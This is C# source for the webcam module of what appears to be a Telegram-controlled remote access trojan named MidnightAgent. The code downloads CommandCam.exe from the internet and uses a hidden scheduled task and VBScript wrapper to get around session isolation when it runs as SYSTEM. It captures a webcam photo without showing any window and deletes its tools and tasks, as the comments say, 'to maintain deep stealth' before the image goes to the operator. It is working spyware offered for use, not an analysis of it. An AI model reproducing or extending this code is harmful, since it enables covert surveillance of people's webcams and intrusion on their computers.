using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    public class WebcamFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "cam";
        public string Description => "Capture Webcam (via CommandCam)";
        public string Usage => "/cam [1-3]";

        // Direct download link for CommandCam.exe
        private const string CommandCamUrl = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe";
        private const string ToolName = "CommandCam.exe";

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                // Parse Device Index (CommandCam uses 1-based index by default? No, usually 0 or 1. Let's assume 1-based from user input)
                string devArg = "1";
                if (args.Length > 0)
                {
                    devArg = args[0];
                }

                string publicDir = @"C:\Users\Public";
                string toolPath = Path.Combine(publicDir, ToolName);
                string timestamp = DateTime.Now.ToString("HHmmss");
                string outputFile = Path.Combine(publicDir, $"cam_{timestamp}.jpg");
                
                // 1. Ensure Tool Exists
                if (!File.Exists(toolPath))
                {
                    TelegramInstance?.SendMessage("⬇️ <b>Downloading CommandCam tool...</b>");
                    try
                    {
                        using (var client = new HttpClient())
                        {
                            // Set a realistic User-Agent just in case
                            client.DefaultRequestHeaders.Add("User-Agent", "MidnightAgent");
                            var bytes = await client.GetByteArrayAsync(CommandCamUrl);
                            File.WriteAllBytes(toolPath, bytes);
                        }
                        
                        if (!File.Exists(toolPath))
                            return FeatureResult.Fail("❌ Failed to download CommandCam.exe");
                    }
                    catch (Exception ex)
                    {
                        return FeatureResult.Fail($"❌ Download Error: {ex.Message}");
                    }
                }

                // 2. Prepare Command
                // CommandCam usage: CommandCam /filename image.jpg /devnum 1 /delay 500
                string cmdArgs = $"/filename \"{outputFile}\" /devnum {devArg} /delay 1000";

                // 3. Execute (Session 0 Bypass)
                bool isSystem = System.Security.Principal.WindowsIdentity.GetCurrent().IsSystem;

                if (isSystem)
                {
                    // Run as Users via Scheduled Task
                    try 
                    {
                        TelegramInstance?.SendMessage("🔒 <b>Running CommandCam (Session Bypass)...</b>");
                        
                        string taskName = "MidnightCam";
                        RunSchTasks($"/Delete /TN \"{taskName}\" /F");
                        
                        // Create Task
                        // WRAPPER: Use VBScript WScript.Shell to launch completely hidden (0)
                        string vbsPath = Path.Combine(publicDir, "cam_runner.vbs");
                        
                        // VBScript String Escape: Replace " with "" inside the string literal
                        string safeArgs = cmdArgs.Replace("\"", "\"\"");
                        string vbsContent = $"CreateObject(\"WScript.Shell\").Run \"\"\"{toolPath}\"\"\" & \" \" & \"{safeArgs}\", 0, True";
                        File.WriteAllText(vbsPath, vbsContent);
                        
                        string runCmd = $"wscript.exe \"{vbsPath}\"";
                        
                        // Create Task to run VBS
                        string createArgs = $"/Create /TN \"{taskName}\" /TR \"{runCmd}\" /SC ONCE /ST 00:00 /RI 1 /IT /RU Users /F";
                        string createResult = RunSchTasks(createArgs);
                        
                        if (!createResult.Contains("SUCCESS"))
                        {
                             return FeatureResult.Fail($"Task Create Failed: {createResult}");
                        }
                        
                        string runResult = RunSchTasks($"/Run /TN \"{taskName}\"");
                        
                        // Wait for file
                        TelegramInstance?.SendMessage("⏳ <b>Capturing...</b>");
                        for (int i = 0; i < 15; i++) // Wait up to 15 seconds
                        {
                            if (File.Exists(outputFile) && new FileInfo(outputFile).Length > 0) break;
                            await Task.Delay(1000);
                        }
                        
                        // Cleanup Task & VBS
                        RunSchTasks($"/Delete /TN \"{taskName}\" /F");
                        try { File.Delete(vbsPath); } catch { }
                    }
                    catch (Exception ex)
                    {
                         return FeatureResult.Fail($"Session Bypass Failed: {ex.Message}");
                    }
                }
                else
                {
                    // Run directly if not SYSTEM
                    var psi = new ProcessStartInfo
                    {
                        FileName = toolPath,
                        Arguments = cmdArgs,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden, // Extra safety
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };
                    var p = Process.Start(psi);
                    p.WaitForExit(5000);
                }

                // 4. Cleanup & Return
                
                // Delete the tool to maintain deep stealth (clean up artifacts)
                try { if (File.Exists(toolPath)) File.Delete(toolPath); } catch { }
                
                // Delete legacy logs if they exist
                string legacyLog = Path.Combine(publicDir, "cam_debug.log");
                try { if (File.Exists(legacyLog)) File.Delete(legacyLog); } catch { }

                if (File.Exists(outputFile) && new FileInfo(outputFile).Length > 0)
                {
                    // FeatureResult.File automatically sets DeleteFileAfterSend = true
                    return FeatureResult.File(outputFile, "📸 <b>Webcam Captured</b>");
                }
                else
                {
                    return FeatureResult.Fail("❌ Capture Failed. No file produced.");
                }
            }
            catch (Exception ex)
            {
                return FeatureResult.Fail($"Error: {ex.Message}");
            }
        }

        private string RunSchTasks(string args)
        {
            try
            {
                var p = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "schtasks",
                        Arguments = args,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    }
                };
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return output;
            }
            catch (Exception ex)
            {
                return $"Exec Error: {ex.Message}";
            }
        }
    }
}
